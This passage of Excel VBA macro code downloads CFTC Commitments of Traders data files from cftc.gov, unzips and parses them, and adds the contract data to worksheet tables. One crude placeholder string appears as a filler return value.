    Set Progress_Control = Nothing
End If

With WorksheetFunction
    Variable_Sheet.ListObjects("Saved_Variables").DataBodyRange.Cells(1, 2).Value2 = .Max(.Index(Query, 0, 1))
End With    'update last updated date variable
End Sub
Private Sub Refresh(Optional Refresh_Dates As Boolean = False)

Dim HG As QueryTable

If Refresh_Dates = False Then
    Set HG = Weekly.ListObjects("Weekly").QueryTable
Else
    Set HG = Variable_Sheet.ListObjects("Dates_Table").QueryTable
End If

HG.Refresh BackgroundQuery:=Refresh_Dates

Set HG = Nothing

End Sub
Private Sub Weekly_2007_Dictionary(ByRef Weekly_D As Dictionary)

    Weekly_D.Add 1, Environ("TEMP") & "\" & Date & "_Legacy_Weekly.txt" 'add item
    
    Call Get_File("https://www.cftc.gov/dea/newcot/deacom.txt", Weekly_D.Item(1)) 'download url with previous line name
    
End Sub
Sub New_Contract()
Attribute New_Contract.VB_Description = "Must know CFTC contract code and be on a new sheet"
Attribute New_Contract.VB_ProcData.VB_Invoke_Func = " \n14"
    
    Dim Contract_Code As String, URL As String, YearO As Long, G As String, X As Long, T As Long, New_CR() As Variant, _
    File_Collection As New Dictionary, C_Name As String, FileN As String, File_Block_Zip As String, _
    Variable_Range As Range, WorkbookName_X As String
    
    #If Mac Then
        MsgBox "This macro is unavailable to your operating system."
        Exit Sub
    #End If
    
    With Application

        .DisplayAlerts = False: .EnableEvents = False: .ScreenUpdating = False: .DisplayStatusBar = True: .DisplayAlerts = False
        .StatusBar = "Downloading appropriate files."
       
        HUB_Name = .Run("'" & ThisWorkbook.Name & "'!Get_Worksheet_Info") 'load data into array and apply to spreadsheet
        
    End With
   
    With ThisWorkbook
    
        Set WK = .Worksheets.Add
        
        With WK
        
            .Range("AV:AW, AY:BB, AR:AR").NumberFormat = "0%"
            .Columns("AG:AG").NumberFormat = "@"
            .Columns("A:A").NumberFormat = "yyyy-mm-dd;@"
        
        End With
        
        WorkbookName_X = Split(ThisWorkbook.Name, ".")(0) 'name of workbook without extension
        
    End With
        
    Set Variable_Range = Variable_Sheet.ListObjects("Saved_Variables").DataBodyRange

    T = Variable_Range.Range("B2").Value2 'last updated date
      
    File_Block_Zip = Environ("TEMP") & "\Legacy_1995_2016_MoshiM.zip"
    
    Const DEF_URL As String = "https://www.cftc.gov/files/dea/history/deacom_xls_1995_2016.zip"
    
    Const Partial_Url As String = "https://www.cftc.gov/files/dea/history/dea_com_xls_"
    
    Const File_Within_Year As String = "annualof.xls"
    
    YearO = 2017: X = 1

With File_Collection

    Do While YearO <= Year(T) + 1
        
        Select Case YearO
        
            Case Year(T) + 1
                
                If Dir(File_Block_Zip) = vbNullString Then 'if the Excel_File doesn't exist
                    
                    Call Get_File(DEF_URL, File_Block_Zip) 'download the file
                                    
                    .Add CStr(X), "Com95_06.xls"
                    
                    .Add CStr(X + 1), "Com07_14.xls"
                    
                    .Add CStr(X + 2), "Com15_16.xls"
                    
                    For X = X To X + 2
                    
                        G = CStr(X)
                    
                        Call entUnZip1File(File_Block_Zip, Environ("TEMP"), .Item(G)) 'unzip the file
                        
                        FileN = .Item(G)
                        
                        .Item(G) = Environ("TEMP") & "\" & WorkbookName_X & "_" & Mid(.Item(G), 4, 5) & "_MoshiM.xls"
                        
                        Name Environ("TEMP") & "\" & FileN As .Item(G)
                        
                    Next X
                 
                Else
                
                    G = CStr(X)
                    .Add G, Environ("TEMP") & "\" & WorkbookName_X & "_" & "95_06_MoshiM.xls" 'File_Path will now hold the path to the .txt file
                    .Add G + 1, Environ("TEMP") & "\" & WorkbookName_X & "_" & "07_14_MoshiM.xls"
                    .Add G + 2, Environ("TEMP") & "\" & WorkbookName_X & "_" & "15_16_MoshiM.xls"
                
                End If
                                            
            Case Else
                    
                Select Case YearO:
                
                   Case Year(T)
                
                        FileN = Environ("TEMP") & "\" & T & "_" & WorkbookName_X & "_" & YearO & "_MoshiM.xls"
                   
                    Case Else
                
                        FileN = Environ("TEMP") & "\" & WorkbookName_X & "_" & YearO & "_MoshiM.xls"
                   
                End Select
                            
                URL = Partial_Url & YearO & ".zip" 'Declare URL of Zip file
                
                G = CStr(X)
    
                If Dir(FileN) = vbNullString Then 'if the file doesn't exist then
                        
                    .Add G, Replace(FileN, ".xls", ".zip")
                
                    Call Get_File(URL, .Item(G)) 'Download Zip
                
                    Call entUnZip1File(.Item(G), Environ("TEMP"), File_Within_Year) 'Unzip specified file
                    
                    .Item(G) = FileN
                    
                    Name Environ("TEMP") & "\" & File_Within_Year As .Item(G) 're-names the .txt file inside dictionary
                
                Else
                    
                    .Add G, FileN

                End If
                
        End Select
        
        YearO = YearO + 1: X = X + 1

    Loop

End With

With Application
    
    .DisplayAlerts = True

    .StatusBar = "Download Complete. Input Contract Code"

End With
    
Do While True 'Will always be true

Input_Code:

    Contract_Code = Application.InputBox("Please supply the Contract Code of the contract you want")
        
        If Contract_Code = "False" Or Contract_Code = vbNullString Then
            
            If MsgBox("No input recieved. Would you like to try again?", vbYesNo) = vbYes Then
                GoTo Input_Code
            Else
                Call Re_Enable: Exit Sub
            End If
            
        End If
            
    With Application
    
        If IsError(.Match(Contract_Code, .Index(HUB_Name, 0, 1), 0)) = True Then 'if the contract Code is not found within
                                                                          'HUB_Name
            Exit Do
        
        Else
        
            C_Name = HUB_Name(.Match(Contract_Code, .Index(HUB_Name, 0, 1), 0), 3) 'worksheet name corresponding to the contract code
            
            If MsgBox("Selected contract already exists within this workbook on worksheet : " & C_Name & vbNewLine & _
            "Would you like to try again with a different Contract Code?", vbYesNo, "Please choose") _
                    = vbNo Then
                        
                Call Re_Enable: Exit Sub
                
            End If

        End If
    
    End With
            
 Loop
            
    T = Variable_Range.Cells(2, 2).Value2
    
    Application.StatusBar = "User Input recieved. Now selecting for all contracts matching criteria. This may take a while"
    
    New_CR = Historical_Parse(File_Collection, "Specific Contract", TypeF, Contract_Code) 'returns Query_Range
    
    ReDim Preserve New_CR(LBound(New_CR, 1) To UBound(New_CR, 1), LBound(New_CR, 2) To T + 19)
    
    New_CR = Multi_Calculations(New_CR, UBound(New_CR, 1), T, 156, 26, True)
    
    Call Paste_To_Range(WK, Sheet_Data:=New_CR, Historical_Paste:=True)
    
    Call Courtesy: Re_Enable
    
End Sub
Private Sub Paste_To_Range(Target_Sheet As Worksheet, Optional Row_Data As Variant, Optional Sheet_Data As Variant, Optional Historical_Paste As Boolean = False)

Dim WK2 As ListObject, TG As Range, H() As String, I As Byte

If Historical_Paste = True Then 'pastes to active sheet and retrieves headers from sheet 15

    On Error GoTo PROC_ERR_Paste

    Set WK2 = Model_S.Range("A3").ListObject
        
    With WK2
    
        .DataBodyRange.Copy 'copy and paste formatting
        
        Target_Sheet.Range(.HeaderRowRange.Address).Value2 = .HeaderRowRange.Value2       'table headers
    
    End With
    
    With Target_Sheet
    
        .Range("A2").Resize(UBound(Sheet_Data, 1), UBound(Sheet_Data, 2)).Value2 = Sheet_Data  'adds data to worksheet
        
        Set WK2 = .ListObjects.Add(xlSrcRange, , , xlYes) 'create table from range on Target_Sheet
        
        .Range("A3").ListObject.DataBodyRange.PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, _
        SkipBlanks:=False, Transpose:=False 'paste conditional formats
               
        .Hyperlinks.Add Anchor:=.Cells(1, 1), Address:=vbNullString, SubAddress:= _
               "'" & HUB.Name & "'!A1", TextToDisplay:=.Cells(1, 1).Value 'create hyperlink
        
        On Error GoTo Re_Name
            
        Sheet_Data(UBound(Sheet_Data, 1), 2) = Left(Sheet_Data(UBound(Sheet_Data, 1), 2), 20)
        
        H = Split(": , / , \ , ? , * , [ , ]", " , ")
        
        For I = LBound(H) To UBound(H)
            
            Sheet_Data(UBound(Sheet_Data, 1), 2) = Replace(Sheet_Data(UBound(Sheet_Data, 1), 2), H(I), vbNullString)
        
        Next I
        
        .Name = Sheet_Data(UBound(Sheet_Data), 2)
    
    End With
    
    Application.StatusBar = "Data has been added to sheet. Calculating Formulas"
    
ElseIf Row_Data(1, 1) > Sheet_Data(UBound(Sheet_Data, 1), 1) Then 'Just in case CFTC and ICE Isn't updated at the same time
            
    On Error GoTo No_Table
    
    With Target_Sheet
    
        .DisplayPageBreaks = False
        
        Set TG = CFTC_Table(ThisWorkbook, Target_Sheet).DataBodyRange
        'Guaranteed to exist due to previous procedure |Get_WS_Info|
        'Find Table with the correct Header and set = to the databodyrange
    End With
    
    With TG
        .Cells(.Rows.count + 1, 1).Resize(UBound(Row_Data, 1), UBound(Row_Data, 2)).Value2 = Row_Data 'bottom row +1,1st column
    End With 'pastes the bottom row of the array if bottom date is greater than previous
        
    Set TG = Nothing
     
End If

On Error GoTo 0

Exit Sub
    
Re_Name:

   MsgBox " If you were attempting to add a new contract then the Worksheet name could not be changed automatically"
    
    Resume Next
    
PROC_ERR_Paste:

    MsgBox "Error: (" & Err.Number & ") " & Err.Description, vbCritical
        Stop: Err.Clear
    Resume Next
    
No_Table:
    MsgBox "If you are seeing this then either a table could not be found in cell A1 or your version " & _
    "of Excel does not support the listbody object. Further data will not be updated. Contact me via email."
    Call Re_Enable: End
    
End Sub
Private Sub Weekly_Text_File(File_Path As Dictionary)

Dim filenumber As Byte, MyData As String, File_IO As Variant, element() As String, strData() As String, D As Long, _
C_Dict As Dictionary, TA() As String, T As Long

    For Each File_IO In File_Path.Items

        filenumber = FreeFile

        Open File_IO For Input As #filenumber

            MyData = Input(LOF(filenumber), #filenumber) 'MyData is a string containing everything in the txt document

        Close #filenumber
    
        strData = Split(MyData, vbCrLf) 'separates the above query into separa  te contracts by line

        MyData = vbNullString
        
        If InStr(1, File_IO, "ICE") > 0 Then
            T = 1
        Else
            T = 0
        End If
        
        For D = LBound(strData) + T To UBound(strData) 'Loop each row in the string Array

            Select Case strData(D) ' a line in the .csv or .txt file

                Case vbNullString
                    
                    'If equal To an empty String Or the first row Then Do Nothing
                Case Else
                    'Replaces commas that are not within quotation marks and places in a new delimited array

                    element = Change_Delimiter_Not_Between_Quotes(strData(D), ",") 'returns an array [working]
                    
                    If element(3) = vbNullString Then element(3) = element(6)
                    'element(3) is the contractID ie 4th element in this 0 based array
                    
                    With All_Contracts
                    
                        If Not .Exists(element(3)) Then 'create a new dictionary
                            
                            'Dictionary within a Dictionary used to group Like contracts when parsing into a combined array
                            
                            Set C_Dict = New Dictionary
                        
                            .Add element(3), C_Dict
    
                        'add Created dictionary to the Origianl/Primary and Key with the Contract Code
                        End If
        
                        Set C_Dict = .Item(element(3)) 'should correspond with a dictionary within a dictionary
                
                    End With
                    
                    If InStr(1, File_IO, "ICE") > 0 Then 'If ICE is in the File Path
                        
                        If InStr(1, element(2), "-") > 0 Then
                        
                            TA = Split(element(2), "-")
                            
                        ElseIf InStr(1, element(2), "/") > 0 Then
                        
                            TA = Split(element(2), "/")
                            
                        End If
                    
                        element(2) = CLng(DateSerial(TA(2), TA(0), TA(1)))
                    
                    Else 'For CFTC Contracts
                        element(2) = CLng(CDate(element(2)))
                    End If
                
                    C_Dict.Add element(2) & "-" & element(0), element
                'Add element to dictionary ; serial dates_name used as key within Secondary Dictionary
            End Select

        Next D 'next string line
        
        Kill File_IO
        
    Next File_IO

End Sub
Private Function Multi_Week_Addition(My_Dictionary As Dictionary, Sort_Type As Byte) As Variant 'adds the contents of the NEW array TO the contents of the OLD

Dim T As Long, Worksheet_Data As Variant, s As Long, UB1 As Long, UB2 As Long, _
Item As Variant, Storing As Variant, X As Long

'check the boundaries of the elements to create the array
    
On Error GoTo 0

With My_Dictionary

    Select Case Sort_Type

        Case 0 'Array Elements are 1D | single rows |  "Historical_Parse"

            UB1 = .count 'The number of items in the dictionary will be the number of rows in the final array

            For Each Item In .Items 'loop through each item in the row and find the max number of columns
                
                s = UBound(Item) + 1 - LBound(Item)
                
                If s > UB2 Then UB2 = s
                
            Next Item
            
        Case 3 'for when there is an indeterminate number of  2D[1-Based] arrays to be joined.
               'for when the size of each array in the dictionary isn't known
               '"Historical_Excel_Creation"
            For Each Item In .Items
            
                UB1 = UBound(Item, 1) + UB1
                
                s = UBound(Item, 2)
                
                If s > UB2 Then UB2 = s
                
            Next Item

        Case 1
            'Normal WEEKLY operation [appending 1 based 1D array to 1 based 2D
            'Or SUB: Block_Query

            'On Error Resume Next

            s = UBound(.Item("Old"), 2) 'number of Columns used for the Old data
            
            If .Exists("Latest") Then 'This key is used for when soring weekly data
            
                T = UBound(.Item("Latest")) 'number of columns in the latest data  [1-based 1D]
                
            ElseIf .Exists("Block") Then 'This key is used if several weeks have passed
                                         'This will be a 2d array
                T = UBound(.Item("Block"), 2)
            
            End If
            
            Select Case Err.Number

                Case 0 'if there was no error
                
                    If .Exists("Latest") Then 'weekly data
                    
                        UB1 = UBound(.Item("Old"), 1) + 1 ' +1 Since there will be only 1 row of additional weekly data
                    
                    Else 'Block data from missing several weeks
                    
                        UB1 = UBound(.Item("Old"), 1) + UBound(.Item("Block"), 1)
                        
                    End If
                    
                    If s >= T Then
                        UB2 = s
                    Else
                        UB2 = T
                    End If
                    
                Case Else 'if an error occured [I honestly don't remember what this is used for]
                
                    If .Exists("Old") Then
    
                        UB1 = UBound(.Item("Old"), 1) + 1
                        
                        If .Exists("Latest") Then
                        
                            UB2 = Application.Max(UBound(.Item("Old"), 2), UBound(.Item("Latest")))
                        
                        Else
                        
                            UB2 = Application.Max(UBound(.Item("Old"), 2), UBound(.Item("Block")))
                        
                        End If
                        
                    End If
                
            End Select

    End Select
    
    If Err.Number <> 0 Then Err.Clear
    
    ReDim Worksheet_Data(1 To UB1, 1 To UB2)
    
    s = 1

    For Each Item In My_Dictionary.Keys 'for each array
    
        Storing = .Item(Item) 'use an array to store the item so repeated calls to the dictionary aren't needed
        
        Select Case Sort_Type

            Case 0 'for when all items in the dictionary are 1D

                For T = LBound(Storing) To UBound(Storing) 'Worksheet_Data is 1 based
                    
                    Worksheet_Data(s, T + 1 - LBound(Storing)) = Storing(T)

                Next T

                s = s + 1

            Case 1, 3 'At least 1 item in the dictionary is already 2D

                Select Case Item

                    Case "Old"
                        'first populate the array with Historical Data from the Old array
                        For s = LBound(Worksheet_Data, 1) To UBound(Storing, 1)

                            For T = LBound(Storing, 2) To UBound(Storing, 2)

                                Worksheet_Data(s, T) = Storing(s, T)

                            Next T
                            
                        Next s
                        
                    Case "Block" '
                    
                        X = 1
                        
                        For s = UBound(Worksheet_Data, 1) - UBound(Storing, 1) + 1 To UBound(Worksheet_Data, 1)

                            For T = LBound(Storing, 2) To UBound(Storing, 2)

                                Worksheet_Data(s, T) = Storing(X, T)
                                
                            Next T
                            
                            X = X + 1
                        
                        Next s
                        
                    Case "Latest"   '1 based 1D "WEEKLY" array
                                    ' "OLD" is run first so S is already at the correct incremented value
                        For T = LBound(Storing) To UBound(Storing)
                            
                            Worksheet_Data(s, T) = Storing(T) 'worksheet data is 1 based 2D while Item is 1 BASED 1D

                        Next T
                        
                    Case Else 'for when there are an indeterminate number of arrays"Historical_Excel_Creation"
                    
                        X = 1
                        
                        For s = s To UBound(Storing, 1) + (s - 1)

                            For T = LBound(Storing, 2) To UBound(Storing, 2)

                                Worksheet_Data(s, T) = Storing(X, T)
                                
                            Next T
                            
                            X = X + 1
                        
                        Next s
                        
                End Select

        End Select
        
        Erase Storing
        
    Next Item

End With

    Multi_Week_Addition = Worksheet_Data
    
    If Err.Number <> 0 Then Err.Clear
    
Exit Function

Append_Error:
    MsgBox "An error occured while appending the new array to the old array"

End Function
Private Function Historical_Parse(ByVal File_Dict As Dictionary, Dictionary_Type As String, File_Type As String, Optional Contract_Code As String = vbNullString, Optional After_This_Date As Long = 0)

Dim C_Dict As Dictionary, Contract_ID As String, Date_Sorted As New Dictionary, Item As Variant, element As Variant, _
Temp_Array As Variant, D_Dict As New Dictionary, Contract_WB As Workbook, Contract_WB_Path As String, All_WB As String, _
Yearly_WB As String, Y As Long

On Error GoTo 0
    
With Application
    
    .ScreenUpdating = False

End With

    If All_Contracts Is Nothing Then

        Set All_Contracts = New Dictionary
    Else
        All_Contracts.RemoveAll

    End If
    '_______________________________________________________________________________________________________________
    Select Case Dictionary_Type

        Case "Yearly", "Specific Contract"

            Contract_WB_Path = Environ("TEMP") & "\" & Split(ThisWorkbook.Name, ".")(0)
    
            If Dictionary_Type = "Yearly" Then
            
                Contract_WB_Path = Contract_WB_Path & "_Yearly_MoshiM.xlsb"
                
            ElseIf Dictionary_Type = "Specific Contract" Then
            
                Contract_WB_Path = Contract_WB_Path & "_Complete_MoshiM.xlsb"
                
            End If
            
            If Dir(Contract_WB_Path) = vbNullString Then 'if the file doesn't exist then create it
                
                Call Historical_Excel_Creation(Contract_WB, File_Dict, Contract_WB_Path) 'open files and combine into a single document

            Else 'if the file exists

                If Test_For_Data_Addition(Contract_WB_Path) Then 'if new data has been added since last workbook was created
                
                    Kill Contract_WB_Path 'kill and then recreate
                    
                    Call Historical_Excel_Creation(Contract_WB, File_Dict, Contract_WB_Path)

                Else

                    Call Open_File(Contract_WB_Path) 'open file in background
                    
                    Set Contract_WB = Workbooks(Workbooks.count) 'set a reference
        
                End If

            End If
            
            Call Historical_Excel_Aggregation(Contract_WB, Dictionary_Type, Contract_Code)
            
            With Application
            
                .DisplayAlerts = False: Contract_WB.Close: .DisplayAlerts = True
            
            End With
            
        Case "Weekly"

            Call Weekly_Text_File(File_Dict)

    End Select

Skipping_Addition:

    On Error GoTo 0
    
    With All_Contracts
    
        Select Case Dictionary_Type
                
            Case "Yearly", "Specific Contract"
                
                    For Each element In .Keys                                'loop the contracts stored within the dictionary keyed by code
                        
                        Temp_Array = .Item(element)                          'Each item in the primary dictionary is an array
                        
                        For Y = 1 To UBound(Temp_Array, 1)                   'loop rows of the array
                            
                            If CLng(Temp_Array(Y, 3)) > After_This_Date And Dictionary_Type = "Yearly" Then 'If the data is more recent than this workbooks stored data
    
                                D_Dict.Add CLng(Temp_Array(Y, 3)) & "_" & Temp_Array(Y, 1), WorksheetFunction.Index(Temp_Array, Y, 0) '[Date_MarketName] is the dictionary key
                                                     
                            ElseIf Dictionary_Type = "Specific Contract" Then
                                
                                D_Dict.Add CLng(Temp_Array(Y, 3)) & "_" & Temp_Array(Y, 1), WorksheetFunction.Index(Temp_Array, Y, 0)
                            
                            End If
                            
                        
                        Next Y
                        
                    Next element 'next Contract ode
            
            Case "Weekly"
                
                Temp_Array = WorksheetFunction.Index(HUB_Name, 0, 1) 'array containing list of valid contract codes within the workbook
                 
                 For Each element In .Keys 'for each Array held in the Primary Dictionary
    
                    If Not IsError(Application.Match(element, Temp_Array, 0)) Then 'if the contract code is found within the valid list of Contract Codes for the Workbook.
      
                        For Each Item In .Item(CStr(element)).Items 'for each item inside the sub-dictionary
                            
                            If CLng(Item(2)) > After_This_Date Then _
                                        D_Dict.Add CLng(Item(2)) & "_" & Item(LBound(Item)), Item
                            'if the data is more recent than this workbooks stored data
                        Next Item
    
                    End If
    
                Next element
                    
        End Select
                    
    End With
    
    If D_Dict.count = 0 Then 'if there are no items in the dictionary
        
        Historical_Parse = WorksheetFunction.Transpose(Array(After_This_Date, "Big Anime Titties"))

        Exit Function

    End If

    Type_Conversion D_Dict, File_Type 'converts specific elements
    
    If Dictionary_Type = "Weekly" Then
    
        With D_Dict
            
            Temp_Array = .Keys 'dates as serial numbers were used as keys
        
            Call Quicksort(Temp_Array, LBound(Temp_Array), UBound(Temp_Array)) 'sorts smallest to largest
    
            For Each element In Temp_Array 'adds data in the correct order using the date keys
            
                Date_Sorted.Add CStr(element), .Item(CStr(element)) 'dates will still be used as keys
        
            Next element
        
        End With
    
    Else
        Set Date_Sorted = D_Dict '"Yearly" and "Specific Contract" do not require sorting by date.
    End If
    
    With Application
    
        Historical_Parse = Multi_Week_Addition(Date_Sorted, 0) 'places all Arrays inside the Dictionary inside a single 1 based Array

        .StatusBar = ("Contracts successfully aggregated.Performing Calculations. Please standby")

    End With

Exit Function

PROC_ERR:
    MsgBox "Error: (" & Err.Number & ") " & Err.Description, vbCritical
        Stop: Err.Clear
    Resume Next

End Function
Private Sub Historical_Excel_Creation(ByRef Contract_WB As Workbook, File_Dictionary As Dictionary, Path As String)
    
    Dim File_IO As Variant, X As Long, OpenWBS As Range, Contract_WS As Worksheet, Array_CF As New Dictionary, _
    AC() As Variant, Array_IE As Dictionary, IC As Boolean, CF As Boolean
    
    Application.DisplayAlerts = False
    
        Set Contract_WB = Workbooks.Add     'create a new workbook

        Contract_WB.Windows(1).Visible = False

        With Contract_WB.Worksheets(1)

            .Columns("D:D").NumberFormat = "@" 'format as text
            .Columns("B:B").NumberFormat = "000000" 'format as text
            .DisplayPageBreaks = False

        End With
    
    For Each File_IO In File_Dictionary.Items 'open all files

        Application.StatusBar = "Parsing file: " & File_IO & " Please be patient"

    With Contract_WB

        If InStr(1, File_IO, "ICE") > 0 Then

            If .Worksheets.count = 1 Then 'if there is only 1 worksheet

                Set Contract_WS = .Worksheets.Add 'add another to hold ICE contracts
                
                Contract_WS.DisplayPageBreaks = False
                
                Contract_WS.Columns("G:G").NumberFormat = "@" 'format as text
                Contract_WS.Columns("B:B").NumberFormat = "000000"
                
                Set Array_IE = New Dictionary
                
                IC = True
                
            Else

                Set Contract_WS = .Worksheets(2)

            End If

        Else
        
            CF = True
            
            Set Contract_WS = .Worksheets(1)

        End If
        
    End With

        Call Open_File(File_IO) 'open designated file
                    
        Set OpenWBS = Workbooks(Workbooks.count).Worksheets(1).UsedRange 'range on the newly opened excel file
        
        With OpenWBS
        
            If InStr(1, File_IO, "ICE") = 0 Then
        
                Array_CF.Add CStr(Array_CF.count + 1), .Value2 'add the used range to the collection
            
            Else
                
                Array_IE.Add CStr(Array_IE.count + 1), .Value2
            
            End If
            
            .Parent.Parent.Close 'Close newly opened workbook
            
        End With
        
    Next File_IO
    
On Error GoTo Error_While_Compiling
     
    With Contract_WB
    
       If CF = True Then
       
            AC = Multi_Week_Addition(Array_CF, 3)
            
            .Worksheets(1).Range("A1").Resize(UBound(AC, 1), UBound(AC, 2)).Value2 = AC
       
       End If
       
       If IC = True Then
       
            AC = Multi_Week_Addition(Array_IE, 3)
            
            .Worksheets(2).Range("A1").Resize(UBound(AC, 1), UBound(AC, 2)).Value2 = AC
        
        End If

        .SaveAs Filename:=Path, FileFormat:=xlExcel12
    
    End With
    
With Application

    .DisplayAlerts = True

    .StatusBar = "Excel file has been created and saved. Parsing for relevant Contract Codes."

End With

On Error GoTo 0

Exit Sub

Error_While_Compiling:
    
    MsgBox "An error occured while creating Excel workbook for historical data."
    
    Contract_WB.Close: Call Re_Enable: End

End Sub
Private Sub Historical_Excel_Aggregation(Contract_WB As Workbook, Dictionary_Type As String, _
Optional Contract_Code As String)

Dim Worksheet As Byte, T As Byte, C_Dict As Dictionary, Temp_Array As Variant, strData As Variant, Contract_ID As String, _
D_Dict As New Dictionary, OpenWBS As Range, X As Long, L As Long ', TT As Double

On Error GoTo 0

'TT = Timer

Re_Initialize:

    For Worksheet = 1 To 2
       
        If Worksheet = 1 Then
            T = 4 'CFTC Code column
        Else
            T = 7 'ICE Code column
        End If
        
        With Contract_WB
            'if worksheet is empty then skip loop iteraion
            If .Worksheets(Worksheet).UsedRange.Rows.count = 1 Then GoTo Skip_Loop_Worksheet
        
            Set OpenWBS = .Worksheets(Worksheet).UsedRange
            'usedrange of the specified worksheet
        End With
        
        strData = OpenWBS.Columns(T).Value2 'contract codes column has been added to array [T is a number]
        
        With D_Dict 'Dictionary Object
        
            .RemoveAll 'remove all items from the dictionary
            
            For X = LBound(strData, 1) To UBound(strData, 1) 'loop through elements add add unique contract codes to Dictionary Object

                If Not .Exists(CStr(strData(X, 1))) Then .Add CStr(strData(X, 1)), 0 '[Store Contract Code as Key]
                '[If the contract code is not already within the dictionary then add it]
            Next X
            
            strData = .Keys '[Array of unique contract codes]

            If Dictionary_Type = "Specific Contract" Then
                        
                If Not .Exists(Contract_Code) Then 'if the contract code doesn't exist within the dictionary
    
                    Select Case Worksheet 'Check Worksheet iteration
    
                        Case 1 'CFTC Worksheet
    
                            If Contract_WB.Worksheets.count = 1 Then 'If there are only CFTC contracts in the workbook
    
                                GoTo No_Data_Found 'Go to error handler to pick a different Code if User wants to or exit
    
                            Else
    
                                GoTo Skip_Loop_Worksheet 'check the next worksheet
    
                            End If
    
                        Case 2 'if on the 2nd worksheet [ICE] and there's still no match then goto error handler to choose another or exit
    
                            GoTo No_Data_Found
    
                    End Select
    
                End If
    
            End If
        
        End With 'end use of D_Dict [Dictionary Object]

        With OpenWBS 'filter worksheet for rows with the specified contract code and then group
        
            .Sort key1:=.Cells(2, 3), order1:=xlAscending, Header:=xlYes 'sort by date Old to New
            .Sort key1:=.Cells(2, T), order1:=xlAscending, Header:=xlYes 'group by contract code
            
        End With
            
        For L = LBound(strData) To UBound(strData) 'loop through each Unique Key
        
            With OpenWBS
    
                Select Case Dictionary_Type
    
                   Case "Specific Contract" 'Filter the Worksheet for the specific Contract Code
                   
                        Contract_ID = UCase(Contract_Code)
    
                       .AutoFilter Field:=T, _
                                   Criteria1:=Contract_ID, _
                                   Operator:=xlFilterValues, _
                                   VisibleDropDown:=False
    
                   Case Else 'For When missing several weeks of data
                   
                       Contract_ID = strData(L)
                                  ' if the contract code is found within the array of worksheets with valid data
                       If Not IsError(Application.Match(Contract_ID, Application.Index(HUB_Name, 0, 1), 0)) Then
                           
                            .AutoFilter Field:=T, _
                                        Criteria1:=Contract_ID, _
                                        Operator:=xlFilterValues, _
                                        VisibleDropDown:=False
                       
                       Else
                           GoTo Skip_Loop_Filter 'otherwise skip this iteration of the Unique Key loop
                       End If
    
                End Select

                Temp_Array = .Offset(1, 0).Resize(.Rows.count - 1, .Columns.count).SpecialCells(xlCellTypeVisible).Value2
    
            End With
    
            With All_Contracts
                 If Not .Exists(Contract_ID) Then .Add Contract_ID, Temp_Array 'V2 CHANGE
            End With

            Erase Temp_Array

            If Dictionary_Type = "Specific Contract" Then Exit For

Skip_Loop_Filter:

        Next L

        If Contract_WB.Worksheets.count = 1 Or Dictionary_Type = "Specific Contract" Then Exit For

Skip_Loop_Worksheet: 'If there is only 1 used row on the worksheet

    Next Worksheet 'next worksheet iteration if available
    
Application.StatusBar = "Relevant data has been found"

'Debug.Print Timer - TT

Exit Sub
   
No_Data_Found:

    If MsgBox("The Selected Contract Code wasn't found" & vbNewLine & "Would you like to try again with a different Contract Code?", vbYesNo, "Please choose") _
                = vbYes Then
        Contract_Code = Application.InputBox("Please supply the Contract Code of the desired contract")

        GoTo Re_Initialize 'restart this SUB

    Else
        Application.StatusBar = vbNullString:
        Call Re_Enable: End 'EXITS ALL CODE Execution
    End If
   
End Sub
Private Sub Type_Conversion(ByRef Contract_Dictionary As Dictionary, CleanType_L_T_D As String)
    'For 0 based arrays within dictionaries
Dim I As Long, Key As Variant, TempA() As Variant, Columns_Needed As Long, ICE_Codes() As String, TempB As Variant, X As Byte

    Const Offset_1 As Long = 5: Const Offset_2 As Long = 25: Const Offset_3 As Long = 37

    On Error Resume Next

    Select Case CleanType_L_T_D 'OPTION Base 0

        Case "L"

            Columns_Needed = 32

        Case "D"

            ICE_Codes = Split("Wheat,B,RC,W,G,Cocoa", ",")

            Columns_Needed = 35

        Case "T"

            Columns_Needed = 54

    End Select

With Contract_Dictionary

    For Each Key In .Keys
    
        TempB = .Item(CStr(Key))
        
        If LBound(TempB) = 1 Then X = 1
        
        ReDim TempA(LBound(TempB) To Columns_Needed + X)

        Select Case CleanType_L_T_D

            Case "L"

                For I = LBound(TempA) To UBound(TempA) 'columns of the array

                    Select Case I
                        
                        Case 0 + X 'converts the column of date of strings to serial dates

                            TempA(I) = CLng(CDate(TempB(LBound(TempB) + 2))) 'conversion to serial date

                        Case 1 + X 'market names

                            TempA(I) = Trim(TempB(LBound(TempB)))

                        Case UBound(TempA)                               'Column with Contract Codes

                            TempA(I) = TempB(LBound(TempB) + 3)

                            .Item(CStr(Key)) = TempA

                        Case 2 + X To 11 + X                            '1st uninterrupted block of data
                        
                            TempA(I) = CLng(TempB(I + Offset_1))  ' OF 5

                        Case 12 + X To 22 + X

                            TempA(I) = CLng(TempB(I + Offset_2))

                        Case Else                               'Next uninterrupted block [only one for this report]

                            TempA(I) = CDbl(TempB(I + Offset_2))  'OF 2 is 25

                    End Select

                Next I

            Case "D"

                For I = LBound(TempA) To UBound(TempA) 'columns of the array

                    Select Case I
                        
                        Case 0 + X 'converts the 2 columns of strings to dates

                            TempA(I) = CLng(CDate(TempB(LBound(TempB) + 2)))

                        Case 1 + X                                  'Contract Name

                            TempA(I) = Trim(TempB(LBound(TempB)))

                        Case 2 + X To 17 + X

                            TempA(I) = CLng(TempB(I + Offset_1))  'OF 5

                        Case 18 + X To 33 + X

                            TempA(I) = CLng(TempB(I + Offset_3))  'OF 37

                        Case UBound(TempA) - 1                      'Units

                            TempA(I) = Replace(TempB(LBound(TempB) + 185), Chr(34), vbNullString)
 
                        Case UBound(TempA)                          'Contract Codes

                            If InStr(1, LCase(TempB(LBound(TempB))), "option") <> 0 Then

                                TempA(I) = TempB(LBound(TempB) + 6)        'ICE Contract Codes

                            Else
                            
                                TempA(I) = TempB(LBound(TempB) + 3)    'CFTC Codes

                            End If

                            If InStr(1, LCase(TempB(LBound(TempB))), "ice") = 1 And InStr(1, LCase(TempB(LBound(TempB))), "option") = 0 And _
                            IsInArray(TempA(UBound(TempA)), Application.Index(HUB_Name, 0, 1)) Then

                                'if ICE is found in the first position and option is not found then remove the array
                                .Remove (CStr(Key))

                            Else

                                .Item(CStr(Key)) = TempA
                            
                            End If
                            
                    End Select

                Next I

            Case "T"

                For I = LBound(TempA) To UBound(TempA) 'columns of the array

                    Select Case I
                        
                        Case 0 + X 'serial dates

                            TempA(I) = CLng(CDate(TempB(LBound(TempB) + 2)))

